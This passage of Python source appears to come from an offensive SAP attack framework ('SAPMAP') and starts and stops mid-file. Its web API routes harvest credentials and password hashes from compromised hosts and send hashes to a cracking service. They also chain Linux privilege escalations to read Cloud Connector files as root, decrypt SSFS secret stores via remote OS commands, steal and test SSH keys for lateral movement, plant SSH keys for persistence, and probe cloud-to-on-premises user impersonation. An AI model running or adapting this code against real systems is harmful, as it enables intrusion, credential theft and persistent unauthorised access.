        print(f"[*] SCC {host}: hashes.com lookup: {cracked_count}/{total} "
              f"user(s) cracked, {unique_count} unique hash(es) submitted, "
              f"cost={cost} credits")
        return json.dumps({"ok": True, "results": results,
                           "cracked": cracked_count, "cost": cost,
                           "unique_hashes": unique_count})

    # -- Node operations --
    @app.route("/api/node/<sid>/credentials", method="POST")
    def node_credentials(sid):
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        creds = Credentials(
            username=data.get("username", ""),
            password=data.get("password", ""),
            client=data.get("client", "100"),
            instance_nr=data.get("instance_nr", "00"),
        )

        def _verify_creds():
            """pyrfc test_connection by default; SOAP RFC_PING when the
            gateway is firewalled.  Phase 3b: an operator typing in
            credentials and clicking Test on an HTTP-only target
            otherwise hangs 60s before reporting failure."""
            if not sapmap_exploit._gateway_port_reachable(node):
                endp = _node_icm_endpoint(api.state, node)
                if endp:
                    host, port, https = endp
                    try:
                        from sap_soap_basic import SOAPRFCSession
                        _s = SOAPRFCSession(
                            host=host, port=port,
                            client=creds.client,
                            user=creds.username,
                            password=creds.password,
                            https=https, timeout=15.0)
                        return _s.test_connection().get("ok", False)
                    except Exception:
                        return False
            return sapmap_rfc.test_connection(node, creds)

        if data.get("test_only"):
            ok = _verify_creds()
            return json.dumps({"success": ok, "message": "OK" if ok else "Failed"})

        # Test and save credentials
        print(f"[*] Testing credentials for {sid}: user={creds.username}, "
              f"client={creds.client}, instance={creds.instance_nr}")
        creds.verified = _verify_creds()
        node.credentials.append(creds)
        if creds.verified:
            print(f"[+] Credentials saved and verified for {sid}")
            # Auto-run the capability analyser — every verified RFC
            # login gives us enough access to read the auth tables
            # and translate the user's privilege set into
            # business-language capabilities.
            try:
                import sapmap_capability_analyser
                _cap_sess, _ = resolve_soap_session_for_node(
                    api.state, node)
                sapmap_capability_analyser.analyse(
                    node, creds, soap_session=_cap_sess)
            except Exception as e:
                print(f"[-] {sid}: capability analyser auto-run "
                      f"failed — {e!s}")
        else:
            print(f"[!] Credentials saved for {sid} but could NOT verify — "
                  f"check the error above. User creation will likely fail.")
        return json.dumps({"success": True, "verified": creds.verified})

    @app.route("/api/node/<sid>/harvest_scc", method="POST")
    def node_harvest_scc(sid):
        """Run harvest_scc_from_pwned_node in a background thread."""
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            result = sapmap_exploit.harvest_scc_from_pwned_node(node, api.state)
            if result.get("error"):
                print(f"[-] {sid}: harvest_scc error: {result['error']}")

        _bg(f"{sid}:harvest_scc", f"{sid}: Harvest SCC (post-RCE)", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/harvest_scc_hashes_via_lpe", method="POST")
    def node_harvest_scc_hashes_via_lpe(sid):
        """Read /opt/sap/scc/config/users.xml as root by chaining the
        Linux LPE.

        Distinct from /harvest_scc (which tries five non-escalating
        paths and stops if all fail) and from /harvest_scc_ssfs
        (which reads SSFS_SCC.KEY/.DAT only).  This one assumes the
        operator wants the bcrypt hash bundle even on a hardened host
        and is OK with running Copy Fail / Dirty Frag to get there.
        """
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        scc_host = None
        node_ip = node.ip or node.hostname or ""
        for h, sn in api.state.scc_nodes.items():
            sn_ip = sn.ip or sn.host or ""
            if sn_ip and sn_ip == node_ip:
                scc_host = h
                break

        def _run():
            _task_start(f"{sid}:harvest_scc_hashes_via_lpe",
                        f"{sid}: Harvest SCC hashes via Linux LPE")
            try:
                from sap_scc_harvest import harvest_scc_hashes_via_lpe
                res = harvest_scc_hashes_via_lpe(node, api.state)
                if not res.get("ok"):
                    print(f"[-] {sid}: harvest_scc_hashes_via_lpe: "
                          f"{res.get('error')}")
                else:
                    print(f"[+] {sid}: harvest_scc_hashes_via_lpe → "
                          f"{res.get('loot_path')} "
                          f"({res.get('bytes_recovered')} B via "
                          f"{res.get('method')})")
            except Exception as e:
                print(f"[-] {sid}: harvest_scc_hashes_via_lpe error: {e}")
            finally:
                _task_end(f"{sid}:harvest_scc_hashes_via_lpe")

        threading.Thread(target=_run, daemon=True).start()
        return json.dumps({"status": "started",
                           "scc_host": scc_host})

    # -- SSH key harvest / lateral movement / persistence ----------------

    @app.route("/api/node/<sid>/ssh_harvest", method="POST")
    def node_ssh_harvest(sid):
        """Phase 1: enumerate OS users, exfiltrate SSH keys, parse
        known_hosts + authorized_keys + config."""
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        data = request.json or {}
        ch = data.get("channel", "auto")

        def _run():
            _task_start(f"{sid}:ssh_harvest",
                        f"{sid}: SSH key harvest")
            try:
                from sap_ssh_lateral import ssh_harvest
                res = ssh_harvest(node, api.state, channel=ch)
                if not res.get("ok"):
                    print(f"[-] {sid}: ssh_harvest: {res.get('error')}")
                else:
                    print(f"[+] {sid}: ssh_harvest → "
                          f"{len(res.get('keys', []))} key(s), "
                          f"{len(res.get('known_hosts_targets', []))} "
                          f"target(s)")
            except Exception as e:
                print(f"[-] {sid}: ssh_harvest error: {e}")
                import traceback; traceback.print_exc()
            finally:
                _task_end(f"{sid}:ssh_harvest")

        threading.Thread(target=_run, daemon=True).start()
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/ssh_loot_keys", method="GET")
    def node_ssh_loot_keys(sid):
        """Return previously harvested SSH keys from the loot manifest."""
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        host_id = (node.ip or node.hostname or sid).replace("/", "_")
        manifest_path = os.path.join("loot", "ssh", host_id,
                                     "harvest.json")
        if not os.path.isfile(manifest_path):
            return json.dumps({"keys": [], "os_users": [],
                               "known_hosts_targets": [],
                               "authorized_keys": []})
        try:
            with open(manifest_path, "r") as fh:
                manifest = json.load(fh)
            return json.dumps(manifest)
        except Exception as e:
            return json.dumps({"error": str(e), "keys": []})

    @app.route("/api/node/<sid>/ssh_test_keys", method="POST")
    def node_ssh_test_keys(sid):
        """Phase 2: test harvested SSH keys against known targets.

        Accepts optional JSON body:
          keys:     [{owner, path, type}, ...] — pre-selected keys
          os_users: [{username, uid, home, shell}, ...] — from harvest
        Falls back to reading loot/ssh/<host>/harvest.json manifest.
        """
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        data = request.json or {}
        ch = data.get("channel", "auto")
        selected_keys = data.get("keys")
        selected_os_users = data.get("os_users")

        def _run():
            _task_start(f"{sid}:ssh_test_keys",
                        f"{sid}: SSH lateral movement test")
            try:
                from sap_ssh_lateral import ssh_test_keys

                harvest_result = None
                if selected_keys:
                    harvest_result = {
                        "keys": selected_keys,
                        "os_users": selected_os_users or [],
                        "known_hosts_targets": [],
                    }
                else:
                    host_id = (node.ip or node.hostname
                               or sid).replace("/", "_")
                    mp = os.path.join("loot", "ssh", host_id,
                                      "harvest.json")
                    if os.path.isfile(mp):
                        with open(mp, "r") as fh:
                            harvest_result = json.load(fh)

                if not harvest_result or not harvest_result.get("keys"):
                    print(f"[-] {sid}: ssh_test_keys — no keys "
                          f"available (run SSH Harvest first)")
                    return

                r = ssh_test_keys(node, api.state,
                                  harvest_result=harvest_result,
                                  channel=ch)
                if not r.get("ok"):
                    print(f"[-] {sid}: ssh_test_keys: {r.get('error')}")
                else:
                    print(f"[+] {sid}: ssh_test_keys → "
                          f"{len(r.get('successful', []))}/"
                          f"{r.get('tested', 0)} successful")
            except Exception as e:
                print(f"[-] {sid}: ssh_test_keys error: {e}")
                import traceback; traceback.print_exc()
            finally:
                _task_end(f"{sid}:ssh_test_keys")

        threading.Thread(target=_run, daemon=True).start()
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/ssh_plant_key", method="POST")
    def node_ssh_plant_key(sid):
        """Phase 3: plant SAPMAP SSH pubkey for persistence."""
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        data = request.json or {}
        ch = data.get("channel", "auto")
        target_user = data.get("target_user", "")

        def _run():
            _task_start(f"{sid}:ssh_plant_key",
                        f"{sid}: SSH key plant")
            try:
                from sap_ssh_lateral import ssh_plant_key
                res = ssh_plant_key(node, api.state,
                                    target_user=target_user,
                                    channel=ch)
                if not res.get("ok"):
                    print(f"[-] {sid}: ssh_plant_key: "
                          f"{res.get('error')}")
                else:
                    print(f"[+] {sid}: ssh_plant_key → "
                          f"{res.get('target_user')} planted")
                    node.ssh_keys_planted = True
            except Exception as e:
                print(f"[-] {sid}: ssh_plant_key error: {e}")
                import traceback; traceback.print_exc()
            finally:
                _task_end(f"{sid}:ssh_plant_key")

        threading.Thread(target=_run, daemon=True).start()
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/harvest_scc_mappings", method="POST")
    def node_harvest_scc_mappings(sid):
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            _task_start(f"{sid}:harvest_scc_mappings",
                        f"{sid}: harvesting SCC mappings via OS-exec")
            try:
                from sapmap_exploit import harvest_scc_mappings_from_pwned_node
                res = harvest_scc_mappings_from_pwned_node(node, api.state)
                if not res.get("ok"):
                    print(f"[-] {sid}: harvest_scc_mappings: {res.get('error')}")
                    return
                # Find the SCC node matching this SAP node's IP
                node_ip = (node.ip or node.hostname or "").lower()
                scc_host = None
                scc_node = None
                for h, sn in api.state.scc_nodes.items():
                    sn_ip = (sn.ip or sn.host or h or "").lower()
                    if sn_ip == node_ip or h.lower() == node_ip:
                        scc_host = h
                        scc_node = sn
                        break
                if not scc_host:
                    # Create a stub SCC node for this host
                    from sapmap_models import SCCNode
                    scc_host = node_ip
                    scc_node = SCCNode(host=scc_host, ip=node_ip,
                                       notes=f"Discovered via OS-exec harvest from {sid}")
                    api.state.scc_nodes[scc_host] = scc_node
                _apply_mappings_to_state(
                    scc_host, scc_node,
                    res.get("mappings") or [],
                    res.get("subaccount_uuids") or [])
                for region in (res.get("regions") or []):
                    if region and region not in (scc_node.tunnel_region or ""):
                        scc_node.tunnel_region = region
            except Exception as e:
                print(f"[-] {sid}: harvest_scc_mappings error: {e}")
            finally:
                _task_end(f"{sid}:harvest_scc_mappings")

        threading.Thread(target=_run, daemon=True).start()
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/harvest_scc_ssfs", method="POST")
    def node_harvest_scc_ssfs(sid):
        """Read on-host SSFS_SCC.KEY + .DAT via OS-exec and decrypt secrets.

        The backup-zip SSFS is double-encrypted by the backup process.
        The raw on-host files decrypt correctly.  This route reads them
        directly from /opt/sap/scc/scc_config/ using base64 over SAPXPG,
        then applies the same _apply_ssfs_decrypt_result pipeline.
        """
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            _task_start(f"{sid}:harvest_scc_ssfs",
                        f"{sid}: Reading on-host SCC SSFS via OS-exec")
            try:
                from sapmap_exploit import execute_os_command as execute_gw_command
                import base64 as _b64

                is_win = "windows" in (node.os_type or "").lower() or \
                         "nt" in (node.os_type or "").lower()

                def _gw(prog, arg):
                    r = execute_gw_command(node, prog, arg, long_params="")
                    return "\n".join(r.get("output") or []).strip()

                # --- Discover SCC root ----------------------------------------
                if is_win:
                    # Enumerate every mounted drive so SCC installs on
                    # non-default drives (P:, D:, …) are also found.
                    drives = _enumerate_windows_drives(_gw)
                    print(f"[*] {sid}: harvest_scc_ssfs Windows drives: "
                          f"{', '.join(drives)}")
                    win_roots = _expand_scc_roots_across_drives(drives)
                    scc_root = None
                    for root in win_roots:
                        probe = rf"{root}\scc_config\SSFS_SCC.KEY"
                        out = _gw("cmd.exe",
                                  f"/c if exist \"{probe}\" echo FOUND")
                        print(f"[*] {sid}: harvest_scc_ssfs probe {probe} → "
                              f"{out[:30]!r}")
                        if "FOUND" in out:
                            scc_root = root
                            break
                    if not scc_root:
                        # Glob fallback across every detected drive +
                        # both \SAP\ and \usr\ top-level layouts.
                        for d in drives:
                            for top in (r"SAP", r"usr"):
                                g = _gw("cmd.exe",
                                        rf"/c dir /s /b {d}\{top}\scc*\scc_config\SSFS_SCC.KEY 2>nul")
                                for line in g.splitlines():
                                    line = line.strip()
                                    if line.upper().endswith("SSFS_SCC.KEY"):
                                        # full path to KEY; root is 2 levels up
                                        import os as _os
                                        scc_root = _os.path.dirname(
                                            _os.path.dirname(line))
                                        print(f"[*] {sid}: harvest_scc_ssfs glob → "
                                              f"{scc_root} (on {d}\\{top})")
                                        break
                                if scc_root:
                                    break
                            if scc_root:
                                break
                else:
                    linux_roots = ["/opt/sap/scc", "/usr/local/scc",
                                   "/opt/sapscc", "/opt/cloud-connector",
                                   "/opt/SAP/cloud-connector"]
                    scc_root = None
                    for root in linux_roots:
                        probe = f"{root}/scc_config/SSFS_SCC.KEY"
                        out = _gw("ls", probe)
                        if probe in out and "No such file" not in out:
                            scc_root = root
                            break

                if not scc_root:
                    print(f"[-] {sid}: harvest_scc_ssfs — SSFS files not found "
                          f"(is_win={is_win})")
                    return

                print(f"[*] {sid}: harvest_scc_ssfs — SCC root={scc_root}")

                # --- Read KEY + DAT -------------------------------------------
                sep = "\\" if is_win else "/"

                def _read_b64(path):
                    if is_win:
                        # certutil -encode to temp, read with more
                        tmp = r"C:\Windows\Temp\.scc_ssfs.b64"
                        _gw("cmd.exe",
                            f"/c certutil -encode \"{path}\" \"{tmp}\" 2>nul")
                        out = _gw("cmd.exe", f"/c more \"{tmp}\"")
                        _gw("cmd.exe", f"/c del /q \"{tmp}\" 2>nul")
                        import re as _re2
                        b64 = "".join(_re2.findall(
                            r'[A-Za-z0-9+/=]+', out))
                    else:
                        out = _gw("base64", path)
                        if not out or "No such file" in out or \
                                "Permission denied" in out:
                            out = _gw("sudo", f"base64 {path}")
                        b64 = out.replace("\n","").replace("\r","")
                    if not b64:
                        return None, "empty output"
                    try:
                        return _b64.b64decode(b64), ""
                    except Exception as e:
                        return None, f"b64 error: {e}"

                key_path = scc_root + sep + "scc_config" + sep + "SSFS_SCC.KEY"
                dat_path = scc_root + sep + "scc_config" + sep + "SSFS_SCC.DAT"
                print(f"[*] {sid}: harvest_scc_ssfs — reading {key_path}")
                key_bytes, kerr = _read_b64(key_path)
                dat_bytes, derr = _read_b64(dat_path)

                if not key_bytes:
                    print(f"[-] {sid}: harvest_scc_ssfs — KEY read failed: {kerr}")
                    return
                if not dat_bytes:
                    print(f"[-] {sid}: harvest_scc_ssfs — DAT read failed: {derr}")
                    return

                print(f"[*] {sid}: harvest_scc_ssfs — KEY={len(key_bytes)}B "
                      f"DAT={len(dat_bytes)}B — decrypting")

                from sapmap_scc_ssfs_decrypt import decrypt_ssfs_from_raw_bytes
                res = decrypt_ssfs_from_raw_bytes(key_bytes, dat_bytes)
                print(f"[*] {sid}: harvest_scc_ssfs — result ok={res.get('ok')} "
                      f"secrets={list((res.get('secrets') or {}).keys())}")

                if not res.get("ok"):
                    sapmap_findings.emit_finding(
                        "INFO", sid,
                        f"On-host SCC SSFS decrypt failed: {res.get('error')}",
                        ref="scc.ssfs.onhost.failed")
                    return

                # Find (or create) the SCC node for this host
                node_ip = (node.ip or node.hostname or "").lower()
                scc_host = None
                scc_node = None
                for h, sn in api.state.scc_nodes.items():
                    snip = (sn.ip or sn.host or h or "").lower()
                    if snip == node_ip or h.lower() == node_ip:
                        scc_host = h; scc_node = sn; break
                if not scc_host:
                    from sapmap_models import SCCNode
                    scc_host = node_ip
                    scc_node = SCCNode(
                        host=scc_host, ip=node_ip,
                        notes=f"Discovered via SSFS harvest from {sid}")
                    api.state.scc_nodes[scc_host] = scc_node

                # Save KEY+DAT to loot so future decrypt_and_unlock can use them
                try:
                    host_slug = scc_host.replace(":", "_").replace("/", "_")
                    loot_dir = os.path.join("loot", "scc", host_slug)
                    os.makedirs(loot_dir, exist_ok=True)
                    for fname, data in [("SSFS_SCC.KEY", key_bytes),
                                        ("SSFS_SCC.DAT", dat_bytes)]:
                        fpath = os.path.join(loot_dir, fname)
                        with open(fpath, "wb") as fh:
                            fh.write(data)
                        os.chmod(fpath, 0o600)
                    print(f"[+] {sid}: harvest_scc_ssfs — KEY+DAT saved to "
                          f"{loot_dir}")
                except Exception as le:
                    print(f"[-] {sid}: harvest_scc_ssfs — loot save error: {le}")

                # Synthesise a decrypt result compatible with _apply_ssfs_decrypt_result
                secrets = res.get("secrets") or {}
                secrets_keys = list(secrets.keys())
                secrets_path = os.path.join(
                    "loot", "scc",
                    scc_host.replace(":", "_").replace("/", "_"),
                    "ssfs_secrets_onhost.txt")
                try:
                    with open(secrets_path, "w") as fh:
                        for k, v in secrets.items():
                            fh.write(f"{k} = {v}\n")
                    os.chmod(secrets_path, 0o600)
                except Exception:
                    pass

                fake_res = {
                    "ok": True,
                    "secrets_path": secrets_path,
                    "secrets_keys": secrets_keys,
                    "keystores": [],
                    "native_lib": "(pure-python / on-host)",
                }
                _apply_ssfs_decrypt_result(scc_host, scc_node, fake_res)

                # Emit per-secret findings
                for k, v in secrets.items():
                    if k == "CLOUD_CONN/JAVA_KEYSTORE_PASSWORD":
                        scc_node.backup_password = v  # store for ks.p12 later
                    sapmap_findings.emit_finding(
                        "CRITICAL" if k != "CLOUD_CONN/JAVA_KEYSTORE_PASSWORD"
                        else "HIGH",
                        scc_host,
                        f"SCC SSFS secret recovered (on-host): {k} = {v!r}  "
                        f"(from {scc_root}/scc_config/ via {sid} OS-exec)",
                        ref="scc.ssfs.onhost.secret",
                        meta={"key": k, "source_sid": sid,
                              "scc_root": scc_root})

            except Exception as e:
                print(f"[-] {sid}: harvest_scc_ssfs error: {e}")
            finally:
                _task_end(f"{sid}:harvest_scc_ssfs")

        threading.Thread(target=_run, daemon=True).start()
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/deep_scan", method="POST")
    def node_deep_scan(sid):
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            sapmap_scanner.deep_scan_single(node)
        _bg(f"{sid}:deep_scan", "Deep Scan", _run)
        return json.dumps({"status": "started"})

    def _kick_standard_scan(sid: str) -> bool:
        """Fire the standard discovery sweep against the host of the
        placeholder SAPNode `sid`.  Returns True when a background
        task was actually scheduled.  Reused from the manual context
        menu route AND the auto-trigger path after a BTP destination
        materialises a placeholder."""
        node = api.state.get_node(sid)
        if not node:
            return False
        host = node.ip or node.hostname
        if not host:
            return False
        cfg = api.state.scan_config or {}
        inst_from = int(cfg.get("inst_from", 0))
        inst_to = int(cfg.get("inst_to", 99))
        timeout = float(cfg.get("timeout", 3.0))
        threads = int(cfg.get("threads", 30))
        port_timeout = float(cfg.get("port_timeout", 3.0))

        def _run():
            print(f"[*] Standard scan starting on {host} "
                  f"(placeholder {sid}) — running discovery sweep …")
            try:
                discovered = sapmap_scanner.discover_systems(
                    [host],
                    instance_range=(inst_from, inst_to),
                    timeout=timeout, threads=threads,
                    fast_mode=True,
                    cancel_event=api.cancel_event,
                    skip_alive=True,
                    port_timeout=port_timeout,
                    node_callback=lambda n: api.state.add_node(n),
                    scc_callback=lambda s: api.state.scc_nodes.update(
                        {s.host: s}),
                )
            except Exception as e:
                print(f"[-] Standard scan failed on {host}: {e}")
                return
            real_nodes = [n for n in (discovered or [])
                          if not n.discovered_via_btp]
            if not real_nodes:
                print(f"[*] Standard scan: no SAP system fingerprinted "
                      f"on {host} — placeholder {sid} kept as-is")
                return
            promoted = real_nodes[0]
            if promoted.sid == sid:
                promoted.discovered_via_btp = False
                api.state.nodes[sid] = promoted
                print(f"[+] Standard scan promoted {sid} in place "
                      f"({promoted.system_type or 'unknown'})")
                return
            moved = 0
            for c in api.state.connections:
                if c.target_sid == sid:
                    c.target_sid = promoted.sid
                    moved += 1
                if c.source_sid == sid:
                    c.source_sid = promoted.sid
                    moved += 1
            for cred in node.credentials or []:
                if not any(x.username == cred.username
                           and x.password == cred.password
                           for x in promoted.credentials):
                    promoted.credentials.append(cred)
            for f in node.findings or []:
                promoted.findings.append(f)
            for sub in api.state.btp_subaccounts.values():
                for d in sub.destinations or []:
                    if (getattr(d, "linked_target_sid", None)
                            == sid):
                        d.linked_target_sid = promoted.sid
            api.state.remove_node(sid)
            print(f"[+] Standard scan promoted {sid} → {promoted.sid} "
                  f"({promoted.system_type or 'unknown'}); {moved} "
                  f"edge(s) re-pointed")

        _bg(f"{sid}:standard_scan", "Standard Scan", _run)
        return True

    # Expose for other endpoints in this scope (e.g. BTP pull/enumerate
    # auto-fire scans on freshly-materialised placeholders).
    api._kick_standard_scan = _kick_standard_scan

    @app.route("/api/node/<sid>/standard_scan", method="POST")
    def node_standard_scan(sid):
        """Run the same discovery sweep used at startup, scoped to a
        single host.  Used to promote a BTP-discovered placeholder
        (`discovered_via_btp=True`) into a fully-fingerprinted node:
        port scan, SAP banner / RFC_SYSTEM_INFO, client enumeration,
        SCC sibling detection.  Replaces the placeholder's SID with
        whatever real SID the scanner reports."""
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        host = node.ip or node.hostname
        if not host:
            return json.dumps({"error":
                f"Node {sid} has no ip / hostname to scan"})
        if not _kick_standard_scan(sid):
            return json.dumps({"error":
                f"Could not schedule scan for {sid}"})
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/verify_pp_impersonation", method="POST")
    def node_verify_pp(sid):
        """Live verification of cloud→on-prem PP impersonation.

        Picks a PP destination on the bound BTP subaccount (or
        creates a temporary one), opens an HTTP CONNECT tunnel
        through the BTP connectivity proxy, sends a single
        /sap/bc/ping + a whoami probe, and reports whether the
        request landed on this on-prem ABAP system as an
        impersonated user.  Cleans up temp destinations afterwards.

        Body params (all optional — auto-detected from node + state):
          scc_host: SCC host to route through.  Defaults to the
                    first scc_links entry on the node.
          subaccount_uuid: BTP subaccount to source the call from.
                    Defaults to the first subaccount_uuids on the SCC.
          keep_destination: when truthy, don't delete the temp
                    destination after the probe so the operator can
                    re-use it manually (default False).
        """
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        data = request.json or {}

        # ---- Resolve which SCC + subaccount + token to use ----
        scc_host = (data.get("scc_host") or "").strip()
        if not scc_host:
            for sh in (node.scc_links or []):
                if sh in api.state.scc_nodes:
                    scc_host = sh
                    break
        scc_node = api.state.scc_nodes.get(scc_host) if scc_host else None
        if not scc_node:
            return json.dumps({"error":
                "No SCC linked to this node — run Standard Scan + "
                "Pull Mappings on the SCC first"})

        subaccount_uuid = (data.get("subaccount_uuid") or "").strip()
        if not subaccount_uuid:
            for u in (scc_node.subaccount_uuids or []):
                if u in (api.state.btp_subaccounts or {}):
                    subaccount_uuid = u
                    break
            if not subaccount_uuid and scc_node.subaccount_uuids:
                subaccount_uuid = scc_node.subaccount_uuids[0]
        if not subaccount_uuid:
            return json.dumps({"error":
                "No BTP subaccount bound to this SCC — run BTP "
                "enumerate with a cf token first"})

        # Pick the token: prefer the region attached to the
        # subaccount we just resolved, fall back to any single
        # token in the store.
        from sap_btp import decode_token_claims, extract_region_from_token
        region = ""
        sub = (api.state.btp_subaccounts or {}).get(subaccount_uuid)
        if sub and getattr(sub, "region", ""):
            region = sub.region
        token = ""
        if region:
            token = api.btp_tokens.get(region, "")
        if not token:
            # Fall back to any token whose region matches the
            # subaccount, then to any token at all if only one.
            for r, t in (api.btp_tokens or {}).items():
                if not region or r == region:
                    token = t
                    region = r
                    break
        if not token:
            return json.dumps({"error":
                "No BTP token in memory — Mint BTP Token or paste a "
                "cf oauth-token first"})

        keep = bool(data.get("keep_destination", False))
        # Connectivity-proxy override.  Resolution priority:
        #   1. per-request body param (one-shot override)
        #   2. server-wide setting on api.btp_proxy_override
        #   3. fall back to the default internal hostname (probe will
        #      timeout from outside BTP and print the cf-ssh hint).
        # Set via env var because the probe reads SAPMAP_BTP_PROXY
        # from there — that path is already covered by the unit
        # tests for the probe module.
        proxy_override = (data.get("proxy_host") or "").strip()
        if not proxy_override:
            proxy_override = (api.btp_proxy_override or "").strip()
        if proxy_override:
            os.environ["SAPMAP_BTP_PROXY"] = proxy_override
        else:
            os.environ.pop("SAPMAP_BTP_PROXY", None)
        # Connectivity-service token for Proxy-Authorization.
        proxy_auth = (data.get("proxy_auth_token") or "").strip()
        if not proxy_auth:
            proxy_auth = (api.btp_proxy_auth_token or "").strip()
        if proxy_auth:
            os.environ["SAPMAP_BTP_PROXY_AUTH_TOKEN"] = proxy_auth
        else:
            os.environ.pop("SAPMAP_BTP_PROXY_AUTH_TOKEN", None)

        def _run():
            _task_start(f"{sid}:verify_pp",
                        f"{sid}: live PP impersonation probe")
            try:
                from sap_pp_probe import verify_pp
                bundle = verify_pp(
                    api.state, node, scc_node, subaccount_uuid,
                    token, cleanup_after=(not keep))
                node.pp_verification = bundle
                node.pp_verification_confirmed = bool(bundle.get("ok"))
                # Include the probe's verified_at timestamp in the
                # message so emit_finding's 60-second dedupe window
                # doesn't swallow repeated probe attempts — operators
                # routinely run the action multiple times in close
                # succession while tuning the tunnel/destination, and
                # need to see every result.
                vat = bundle.get("verified_at") or ""
                stamp = f" [{vat}]" if vat else ""
                if bundle.get("ok"):
                    user = bundle.get("user") or "<unknown user>"
                    conf = bundle.get("confidence") or "MEDIUM"
                    sapmap_findings.emit_finding(
                        "CRITICAL", sid,
                        f"PP impersonation CONFIRMED on {sid} via SCC "
                        f"{scc_node.host} (live probe).  Landed as "
                        f"ABAP user {user!r} "
                        f"(confidence {conf}, "
                        f"HTTP {bundle.get('http_status','?')}, "
                        f"{bundle.get('latency_ms','?')} ms)." + stamp,
                        ref="scc.pp.impersonation.confirmed",
                        meta={"scc_host": scc_node.host,
                              "user": user,
                              "confidence": conf,
                              "destination": bundle.get("destination_used", ""),
                              "verified_at": vat})
                else:
                    verdict = bundle.get("verdict") or "?"
                    sapmap_findings.emit_finding(
                        "INFO", sid,
                        f"PP impersonation probe on {sid} via SCC "
                        f"{scc_node.host}: {verdict} — "
                        f"{bundle.get('error','no detail')}" + stamp,
                        ref=f"scc.pp.impersonation.probe.{verdict}",
                        meta={"scc_host": scc_node.host,
                              "verdict": verdict,
                              "error": bundle.get("error", ""),
                              "verified_at": vat})
            except Exception as e:
                print(f"[-] {sid}: verify_pp_impersonation failed: {e}")
            finally:
                _task_end(f"{sid}:verify_pp")
        threading.Thread(target=_run, daemon=True).start()
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/read_usrextid", method="POST")
    def node_read_usrextid(sid):
        """Read USREXTID — the on-prem cert-CN → ABAP user mapping
        table.  Pairs with the SCC PP analyser to enumerate exactly
        which ABAP users a cloud caller can impersonate when a weak
        <subjectPatterns> rule is in place upstream.

        After the read, cross-link with every linked SCC's PP analysis
        and stash the impersonation surface on
        ``node.pp_impersonation``.  CRITICAL findings emitted into the
        bus when the surface includes privileged accounts."""
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            _task_start(f"{sid}:read_usrextid",
                        f"{sid}: reading USREXTID")
            try:
                from sapmap_rfc import download_usrextid
                rows = download_usrextid(node) or []
                node.usrextid_entries = rows
                from datetime import datetime as _dt, timezone as _tz
                node.usrextid_read_at = (
                    _dt.now(_tz.utc).isoformat(timespec="seconds"))
                if not rows:
                    print(f"[*] {sid}: USREXTID is empty — no cert/SNC "
                          f"→ ABAP user mappings configured on this "
                          f"system.  Even with a weak SCC PP rule "
                          f"upstream there is no on-prem user to "
                          f"land on yet.")
                else:
                    print(f"[+] {sid}: USREXTID read — {len(rows)} entry(s)")
                # Cross-link with every linked SCC's PP rule.  We pick
                # the first SCC with PP analysis for the impersonation
                # report; if multiple SCCs link to this node, the
                # operator can re-run after switching focus.
                from sapmap_scc_pp_analyzer import analyze_pp_impersonation
                linked = node.scc_links or []
                imp = None
                used_scc = ""
                for sh in linked:
                    sn = api.state.scc_nodes.get(sh)
                    if not sn:
                        continue
                    ppa = getattr(sn, "pp_analysis", None) or {}
                    pp = ppa.get("pp_config") or {}
                    if pp.get("ok"):
                        imp = analyze_pp_impersonation(pp, rows)
                        imp["scc_host"] = sh
                        used_scc = sh
                        break
                if imp is None and rows:
                    imp = {
                        "ok": True,
                        "rule_template": "",
                        "rule_caller_controlled": False,
                        "matched_users": [],
                        "privileged_users": [],
                        "exploitability": "blocked",
                        "notes": (
                            "No SCC linked to this node has a parsed "
                            "PP config yet — run Extract Keystore on "
                            "the SCC first."),
                    }
                if imp is None:
                    imp = {"ok": True, "rule_template": "",
                           "rule_caller_controlled": False,
                           "matched_users": [], "privileged_users": [],
                           "exploitability": "blocked",
                           "notes": "USREXTID empty + no SCC PP "
                                    "config available."}
                node.pp_impersonation = imp
                privs = imp.get("privileged_users") or []
                matched = imp.get("matched_users") or []
                if privs:
                    sapmap_findings.emit_finding(
                        "CRITICAL", sid,
                        f"Cloud→on-prem impersonation reachable via "
                        f"SCC {used_scc}: PP rule "
                        f"{imp.get('rule_template','?')} maps cloud "
                        f"caller into {len(matched)} ABAP user(s) "
                        f"on {sid}, including "
                        f"{len(privs)} privileged: "
                        f"{', '.join(sorted(set(p['bname'] for p in privs)))}.",
                        ref="scc.pp.impersonation.privileged",
                        meta={"scc_host": used_scc,
                              "rule": imp.get("rule_template"),
                              "matched_count": len(matched),
                              "privileged_users": [p["bname"] for p in privs]})
                elif matched and imp.get("rule_caller_controlled"):
                    sapmap_findings.emit_finding(
